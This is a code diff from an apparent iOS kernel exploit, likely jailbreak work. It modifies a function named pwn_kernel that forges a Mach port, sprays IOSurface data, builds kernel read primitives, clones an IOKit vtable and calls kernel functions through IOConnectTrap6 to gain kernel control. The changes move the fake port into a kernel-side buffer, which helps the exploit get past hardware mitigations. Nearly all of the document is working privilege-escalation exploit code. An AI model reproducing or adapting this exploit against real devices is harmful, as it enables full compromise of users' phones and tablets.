@@ -160,7 +160,7 @@ static uint32_t transpose(uint32_t val)
 uint32_t *static_spray_data = NULL;
 
 uint32_t curr_highest_key = 0;
-uint32_t *get_me_some_spray_data(uint32_t surface_id, kport_t *fakeport, uint32_t *spray_count)
+uint32_t *get_me_some_spray_data(uint32_t surface_id, kptr_t kdata_addr, uint32_t *spray_count)
 {
     const uint32_t spray_qty = 10;
     *spray_count = (8 + (spray_qty * 5)) * sizeof(uint32_t);
@@ -191,7 +191,7 @@ uint32_t *get_me_some_spray_data(uint32_t surface_id, kport_t *fakeport, uint32_
             *(spray_cur++) = 0x00000000;
             *(spray_cur++) = 0x00000000;
             
-            memcpy(copy_to_here, &fakeport, sizeof(void *));
+            memcpy(copy_to_here, &kdata_addr, sizeof(kptr_t));
         }
 
         return static_spray_data;
@@ -286,14 +286,6 @@ uint64_t send_buffer_to_kernel_and_find(offsets_t offs, uint64_t (^read64)(uint6
         goto err;
     }
 
-    uint64_t data_address = key_address + sizeof(kernel_key);
-
-    LOG("dumping data...");
-    for (int i = 0; i < 0xC0 * 0x8; i += sizeof(uint64_t))
-    {
-        LOG("%x: %llx", i, read64(data_address + i));
-    }
-
     return key_address + sizeof(kernel_key);
 
 err:
@@ -320,8 +312,10 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
     LOG("---> pwning kernel...");
 
-    kptr_t kaddr = kdata_init();
-    if(!kaddr) goto out;
+    kptr_t kdata = kdata_init();
+    if(!kdata) goto out;
+
+    LOG("our kdata buffer is at: %llx", kdata);
 
     // note to friends, family, next of kin, hackers alike:
     // host_page_size - returns the userland page size, *always* 16K
@@ -398,11 +392,10 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     ool_message.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
     
     // setup fake obj
-    fakeport = mmap(0, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+    fakeport = (kport_t *)mmap(0, KDATA_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+    bzero((void *)fakeport, KDATA_SIZE);
+    mlock((void *)fakeport, KDATA_SIZE);
     LOG("fakeport: %p", fakeport);
-    bzero((void *)fakeport, 0x8000);
-    
-    mlock((void *)fakeport, 0x8000);
     
     fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT;
     fakeport->ip_references = 100;
@@ -412,6 +405,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
     fakeport->ip_srights = 99;
     
+    ret = kdata_write((const void *)fakeport); // causes the fakeport buffer to buf flushed into kernel 
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to write to kernel buffer! ret: %x", ret);
+        goto out;
+    }
+
     uint32_t spray_dictsz = 0x0, dummy = 0x0;
     size = sizeof(dummy);
     
@@ -431,7 +431,8 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         mach_msg(&ool_message.head, MACH_SEND_MSG, ool_message.head.msgh_size, 0, 0, 0, 0);
         
         // spray spray spray
-        uint32_t *spray_data = get_me_some_spray_data(surface->id, fakeport, &spray_dictsz);
+        // kdata = address of 'fakeport' buffer in kernel space 
+        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);
         
         IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
         
@@ -467,7 +468,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     for (int i = 0; i < 100; i++)
     {
         uint32_t spray_dictsz = 0;
-        uint32_t *spray_data = get_me_some_spray_data(surface->id, fakeport, &spray_dictsz);
+        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);
         
         uint32_t dummy = 0;
         size = sizeof(dummy);
@@ -517,6 +518,13 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         goto out;
     }
     
+    ret = kdata_read((void *)fakeport);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to read kdata buffer!");
+        goto out;
+    }
+
     if (fakeport->ip_pdrequest == 0)
     {
         LOG("fakeport->ip_pdrequest == 0");
@@ -527,12 +535,15 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     uint64_t heapaddr = fakeport->ip_pdrequest;
     LOG("[+] got port/kernel heap address %llx", heapaddr);
     
-    fakeport->ip_requests = ((uint64_t)fakeport) + 0x1000; // set that to somewhere in the buffer
-    uint64_t *kread_addr = (uint64_t *)(((uint64_t)fakeport) + 0x1000 + offsets.struct_offsets.ipr_size); // kread_addr now points to where ip_requests points + offset of ipr_size
+    // set that to somewhere in the buffer
+    // kport_t is of size 0xA8
+    fakeport->ip_requests = kdata + 0xA8 + 0x8; 
+    uint64_t *kread_addr = (uint64_t *)(((uint64_t)fakeport) + 0xA8 + 0x8 + offsets.struct_offsets.ipr_size); // kread_addr now points to where ip_requests points + offset of ipr_size
     
     mach_msg_type_number_t out_sz = 1;
     #define kr32(addr,value)\
     *kread_addr = addr;\
+    kdata_write((const void *)fakeport);\
     mach_port_get_attributes(mach_task_self(), the_one, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&value, &out_sz);
     
     uint32_t tmp_32read = 0;
@@ -591,7 +602,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     // safety check to make sure we found the right message
     vtab_msg->verification_key = 0x4141414142424242;
 
-    LOG("about to copy vtab...");
+    LOG("cloning vtab...");
     
     // copy out vtable into message body
     for (int i = 0; i < 0xC0; i++)
@@ -620,10 +631,12 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
     LOG("got kernel_vtab_buf at: %llx", kernel_vtab_buf);
 
-    uint64_t fake_client = (uint64_t)fakeport + 0x2000;
+    uint64_t fake_client = (uint64_t)fakeport + 0xC0;
     LOG("fake_client: %llx", fake_client);
 
     // copy out cpp client object into message body
+    // we've got ~0x380 bytes of space left in our 0x400 buffer, 
+    // assuming 0x80 bytes for the fakeport + ip_requests read buffer 
     for (int i = 0; i < 0x200; i++)
     {
         uint64_t obj_entry = 0x0;
@@ -636,8 +649,15 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
 
     // update fakeport as iokit obj & insert new fake client
     fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
-    fakeport->ip_kobject = fake_client;
-    
+    fakeport->ip_kobject = kdata + 0xC0;
+
+    ret = kdata_write((const void *)fakeport);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to write to kdata buffer! (2): %x", ret);
+        goto out;
+    }
+
     // no longer needed
 #undef kr32
 #undef kr64
@@ -668,6 +688,14 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
         
         *(uint64_t *)(fake_client + 0x40) = args[0];
         *(uint64_t *)(fake_client + 0x48) = addr + kslide;
+        
+        kern_return_t ret = kdata_write((const void *)fakeport);
+        if (ret != KERN_SUCCESS)
+        {
+            LOG("failed to write to kdata buffer! ret: %x", ret);
+            return 0x0;
+        }
+
         return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
     };
 
@@ -717,6 +745,9 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     
     LOG("[+] got zone map addr: %llx", zone_map_addr);
     
+    ret = KERN_SUCCESS;
+    goto out;
+
     typedef volatile struct
     {
         kptr_t prev;
